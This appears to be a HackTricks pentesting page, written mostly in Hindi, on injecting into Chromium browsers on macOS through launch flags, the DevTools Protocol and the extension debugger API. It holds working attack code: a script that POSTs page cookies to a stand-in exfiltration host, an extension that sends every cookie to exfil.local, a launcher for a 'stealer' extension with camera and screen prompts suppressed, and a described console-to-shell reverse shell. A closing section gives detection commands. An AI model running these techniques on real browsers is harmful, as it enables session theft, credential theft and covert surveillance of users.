# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi और Opera जैसे Chromium-based browsers समान command-line switches, preference files और DevTools automation interfaces का उपयोग करते हैं। macOS पर GUI access वाले किसी भी user existing browser session को terminate करके उसे arbitrary flags, extensions या target के entitlements के साथ चलने वाले DevTools endpoints के साथ फिर से खोल सकता है।

#### macOS पर Chromium को custom flags के साथ launch करना

macOS प्रत्येक Chromium profile के लिए एक single UI instance रखता है, इसलिए instrumentation के लिए सामान्यतः browser को force-close करना आवश्यक होता है (उदाहरण के लिए `osascript -e 'tell application "Google Chrome" to quit'` के साथ)। Attackers आमतौर पर `open -na "Google Chrome" --args <flags>` के जरिए browser को फिर से launch करते हैं, ताकि app bundle को modify किए बिना arguments inject किए जा सकें। इस command को user LaunchAgent (`~/Library/LaunchAgents/*.plist`) या login hook के अंदर wrap करने से यह सुनिश्चित होता है कि tampered browser reboot/logoff के बाद फिर से चलाया जाए।

#### `--load-extension` Flag

`--load-extension` flag unpacked extensions को auto-load करता है (comma-separated paths)। Legitimate extensions को block करते हुए केवल अपने payload को run कराने के लिए इसे `--disable-extensions-except` के साथ pair करें। Malicious extensions `debugger`, `webRequest` और `cookies` जैसी high-impact permissions मांग सकते हैं, ताकि DevTools protocols में pivot किया जा सके, CSP headers patch किए जा सकें, HTTPS downgrade किया जा सके या browser start होते ही session material exfiltrate किया जा सके।

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

ये switches Chrome DevTools Protocol (CDP) को TCP या pipe पर expose करते हैं, ताकि external tooling browser को control कर सके। Google ने इस interface के infostealer abuse को व्यापक रूप से observe किया और Chrome 136 (March 2025) से default profile के लिए इन switches को ignore किया जाता है, जब तक browser को non-standard `--user-data-dir` के साथ launch न किया जाए। इससे real profiles पर App-Bound Encryption लागू होती है, लेकिन attackers फिर भी fresh profile spawn कर सकते हैं, victim को उसमें authenticate करने के लिए मजबूर कर सकते हैं (phishing/triage assistance), और CDP के जरिए cookies, tokens, device trust states या WebAuthn registrations harvest कर सकते हैं।<sup>[5]</sup>

#### `--user-data-dir` Flag

यह flag पूरे browser profile (History, Cookies, Login Data, Preference files आदि) को attacker-controlled path पर redirect करता है। Modern Chrome builds में `--remote-debugging-port` के साथ इसे combine करना mandatory है। यह tampered profile को isolated भी रखता है, जिससे आप पहले से भरी हुई `Preferences` या `Secure Preferences` files डाल सकते हैं, जो security prompts disable करती हैं, extensions auto-install करती हैं और default schemes बदलती हैं।

#### `--use-fake-ui-for-media-stream` Flag

यह switch camera/mic permission prompt को bypass करता है, जिससे `getUserMedia` call करने वाले किसी भी page को तुरंत access मिल जाता है। इसे `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` जैसे flags या CDP `Browser.grantPermissions` commands के साथ combine करके audio/video को silently capture किया जा सकता है, desktop share किया जा सकता है या user interaction के बिना WebRTC permission checks satisfy किए जा सकते हैं।

## Delivery & Relaunch Patterns Seen in the Wild

CDP abuse आमतौर पर initial payload के बजाय **post-exploitation** stage होता है। एक recent macOS developer-targeting campaign ने poisoned Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`) का उपयोग किया, जिससे code केवल तब execute होता था जब victim project को **built** करता था, न कि केवल उसे clone या open करने पर। First execution के बाद malware ने अन्य `.xcodeproj` trees को भी infect किया, malicious Git `pre-commit` hooks जोड़े और अधिक Xcode projects के लिए ZIP archives search किए।<sup>[3]</sup>

Chromium abuse के लिए यह महत्वपूर्ण है क्योंकि attacker को browser binary को patch करने की आवश्यकता नहीं होती। इसके बजाय, एक short-lived build-phase / `osascript` stager **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher आदि) install कर सकता है, जो user के browser start करने पर हर बार legitimate browser को attacker-controlled flags के साथ फिर से खोलता है।<sup>[3]</sup>

> [!TIP]
> Developer endpoints पर unexpected `curl`, `osascript`, `xxd`, nested `base64` या Chrome relaunch logic के लिए `.pbxproj` files, `.git/hooks/pre-commit` और `.xcodeproj` वाली ZIPs inspect करें।

## Remote Debugging & DevTools Protocol Abuse

जब Chrome को dedicated `--user-data-dir` और `--remote-debugging-port` के साथ फिर से launch कर दिया जाता है, तो आप CDP (जैसे `chrome-remote-interface`, `puppeteer` या `playwright` के जरिए) से attach कर सकते हैं और high-privilege workflows को script कर सकते हैं:

- **Cookie/session theft:** `Network.getAllCookies` और `Storage.getCookies` HttpOnly values return करते हैं, भले ही App-Bound encryption सामान्यतः filesystem access को block करती हो, क्योंकि CDP running browser से उन्हें decrypt करने के लिए request करता है।
- **Permission tampering:** `Browser.grantPermissions` और `Emulation.setGeolocationOverride` आपको camera/mic prompts bypass करने (विशेषकर `--use-fake-ui-for-media-stream` के साथ) या location-based security checks को falsify करने देते हैं।
- **Keystroke/script injection:** `Runtime.evaluate` active tab के अंदर arbitrary JavaScript execute करता है, जिससे credential lifting, DOM patching या navigation के बाद भी survive करने वाले persistence beacons inject किए जा सकते हैं।<sup>[1]</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` और `Fetch.enable` disk artifacts को touch किए बिना authenticated requests/responses को real time में intercept करते हैं।
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
क्योंकि Chrome 136 default profile पर CDP को block करता है, victim की मौजूदा `~/Library/Application Support/Google/Chrome` directory को staging path पर copy/paste करने से अब decrypted cookies प्राप्त नहीं होतीं। इसके बजाय, user को instrumented profile के अंदर authenticate करने के लिए social-engineer करें (जैसे, "helpful" support session) या CDP-controlled network hooks के माध्यम से transit में MFA tokens capture करें।<sup>[5]</sup>

### XCSSET-style CDP Backdoor Chain

एक practical malware pattern इस प्रकार है:

1. हर बार Chrome launch होने पर userland implant या wrapper को restart करें।
2. legitimate browser को `--remote-debugging-port=<port>` के साथ spawn करें और Chrome 136+ पर आमतौर पर paired non-default `--user-data-dir=<dir>` का भी उपयोग करें।
3. एक helper शुरू करें जो local CDP WebSocket से connect होकर `Page.addScriptToEvaluateOnNewDocument` के साथ pre-document hook register करे।<sup>[2]</sup>

वह helper site code के run होने **से पहले** JavaScript inject कर सकता है, जो disk पर files patch किए बिना `window.fetch`, `XMLHttpRequest`, wallet providers या autofill flows को hook करने के लिए ideal है।<sup>[3]</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
एक अधिक शक्तिशाली variant browser को **host command bridge** में बदल देता है: injected JavaScript delimiter-tagged `console.log` emit करता है, local helper `Runtime.consoleAPICalled` को monitor करता है, marker को हटाता है, शेष command को host shell के माध्यम से execute करता है (उदाहरण के लिए Go का `exec.Command`), और stdout/stderr को attacker के WebSocket के जरिए वापस भेजता है। इससे tab-level script execution को लगभग fileless reverse shell में अपग्रेड किया जा सकता है।<sup>[3]</sup>

## Extension-Based Injection via Debugger API

2023 के "Chrowned by an Extension" research ने प्रदर्शित किया कि `chrome.debugger` API का उपयोग करने वाला malicious extension किसी भी tab से attach होकर `--remote-debugging-port` के समान DevTools powers प्राप्त कर सकता है।<sup>[6]</sup> इससे मूल isolation assumptions टूट जाती हैं (extensions अपने context में रहते हैं) और यह सक्षम होता है:

- `Network.getAllCookies`/`Fetch.getResponseBody` के जरिए cookies और credentials की silent theft।
- site permissions (camera, microphone, geolocation) में modification और security interstitial bypass, जिससे phishing pages Chrome dialogs का impersonate कर सकते हैं।
- `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` या `Security.handleCertificateError` को programmatically drive करके TLS warnings, downloads या WebAuthn prompts में on-path tampering।

Extension को `--load-extension`/`--disable-extensions-except` के साथ load करें, ताकि किसी user interaction की आवश्यकता न हो। API को weaponize करने वाला एक minimal background script इस तरह दिखता है:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
The extension `Debugger.paused` events को subscribe करके JavaScript variables पढ़ सकता है, inline scripts को patch कर सकता है, या ऐसे custom breakpoints जोड़ सकता है जो navigation के बाद भी बने रहते हैं। क्योंकि सब कुछ user की GUI session के अंदर चलता है, Gatekeeper और TCC trigger नहीं होते, जिससे यह technique उस malware के लिए आदर्श बनती है जिसने user context में execution पहले ही प्राप्त कर लिया हो।<sup>[6]</sup>

## Detection & Hunting

- उन Chromium browsers पर alert करें जिन्हें `--remote-debugging-port`, `--remote-debugging-pipe`, या किसी suspicious `--user-data-dir` के साथ launch किया गया हो, विशेषकर तब जब parent `bash`, `sh`, `osascript`, `xcodebuild`, या कोई LaunchAgent helper हो।
- ऐसी छोटी chains खोजें जिनमें कोई helper local CDP WebSocket खोलता है, `Page.addScriptToEvaluateOnNewDocument` register करता है, और फिर long-lived outbound WebSocket/HTTPS connection बनाता है।
- Browser `Runtime.consoleAPICalled` activity को attacker-supplied commands execute करने वाले child shells या helper processes के साथ correlate करके console-to-shell bridges की तलाश करें।
- Developer Macs पर `.pbxproj` की `PBXShellScriptBuildPhase` entries, Git `pre-commit` hooks, Dock/login item relaunchers, और browser wrapper installation के लिए ZIP-contained Xcode projects की समीक्षा करें।
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### उपकरण

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - payload extensions के साथ Chromium launches को automate करता है और interactive CDP hooks उपलब्ध कराता है।
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operators के लिए traffic interception और browser instrumentation पर केंद्रित समान tooling।
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - `--remote-debugging-port` instance live होने के बाद Chrome DevTools Protocol dumps (cookies, DOM, permissions) को script करने के लिए Node.js library।

### उदाहरण
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Tools links में और उदाहरण खोजें।

## References

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
